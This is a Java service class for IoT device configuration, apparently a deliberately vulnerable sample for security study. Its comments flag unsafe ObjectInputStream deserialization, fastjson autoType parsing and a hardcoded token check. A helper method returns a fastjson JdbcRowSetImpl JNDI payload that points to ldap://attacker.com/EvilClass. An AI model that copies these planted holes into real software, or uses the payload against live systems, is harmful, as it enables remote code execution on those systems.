package com.iot.device.config;

import com.alibaba.fastjson.JSON;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.stereotype.Service;
import javax.annotation.Resource;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.util.Base64;

/**
 * 设备配置服务
 * @author iot_security
 */
@Service
public class DeviceConfigService {
    @Resource
    private RedisTemplate<String, Object> redisTemplate;

    /**
     * 获取设备状态
     * @param deviceId 设备ID
     * @param configKey 配置键
     * @return 设备状态对象
     * @throws Exception 反序列化异常
     */
    public DeviceState getDeviceState(String deviceId, String configKey) throws Exception {
        String cacheKey = buildCacheKey(deviceId, configKey);
        byte[] rawData = (byte[]) redisTemplate.opsForValue().get(cacheKey);
        
        if (rawData == null) {
            throw new IOException("Config not found");
        }
        
        return deserializeConfig(rawData);
    }

    /**
     * 构建缓存键（存在注入风险）
     */
    private String buildCacheKey(String deviceId, String configKey) {
        return String.format("device:config:%s:%s", deviceId, configKey);
    }

    /**
     * 反序列化配置数据
     */
    private DeviceState deserializeConfig(byte[] data) throws Exception {
        try {
            // 漏洞点：使用不安全的反序列化方式
            ByteArrayInputStream bais = new ByteArrayInputStream(data);
            ObjectInputStream ois = new ObjectInputStream(bais);
            Object obj = ois.readObject();
            ois.close();
            
            if (!(obj instanceof DeviceState)) {
                throw new ClassCastException("Invalid object type");
            }
            return (DeviceState) obj;
        } catch (IOException | ClassNotFoundException e) {
            // 记录日志但继续抛出异常
            System.out.println("反序列化失败: " + e.getMessage());
            throw e;
        }
    }

    /**
     * 处理设备上传的配置文件
     * @param fileId 文件ID
     * @param verifyToken 验证令牌
     */
    public void processConfigUpload(String fileId, String verifyToken) throws Exception {
        // 模拟从文件解析配置
        String configData = retrieveConfigFromStorage(fileId);
        
        // 使用fastjson进行二次解析（存在autoType风险）
        if (verifyToken.equals("SECURE_TOKEN")) {
            DeviceConfig config = JSON.parseObject(configData, DeviceConfig.class);
            updateDeviceSettings(config);
        } else {
            // 使用基础反序列化方法作为备用路径
            byte[] serialized = Base64.getDecoder().decode(configData);
            DeviceState state = deserializeConfig(serialized);
            restoreDeviceState(state);
        }
    }

    // 模拟的辅助方法
    private String retrieveConfigFromStorage(String fileId) {
        // 实际应从存储服务获取
        return String.format("{\\"@type\\":\\"com.sun.rowset.JdbcRowSetImpl\\",\\"dataSourceName\\":\\"ldap://attacker.com/EvilClass\\"}");
    }

    private void updateDeviceSettings(DeviceConfig config) {
        // 更新设备配置逻辑
    }

    private void restoreDeviceState(DeviceState state) {
        // 恢复设备状态逻辑
    }
}

/**
 * 设备状态类
 */
class DeviceState implements java.io.Serializable {
    private static final long serialVersionUID = 1L;
    private String status;
    private int temperature;
    private transient ProcessMonitor monitor;
    
    // Getters/Setters
    public String getStatus() { return status; }
    public void setStatus(String status) { this.status = status; }
    public int getTemperature() { return temperature; }
    public void setTemperature(int temperature) { this.temperature = temperature; }
}

/**
 * 设备配置类
 */
class DeviceConfig {
    private String mode;
    private boolean autoUpdate;
    // 其他配置字段...
}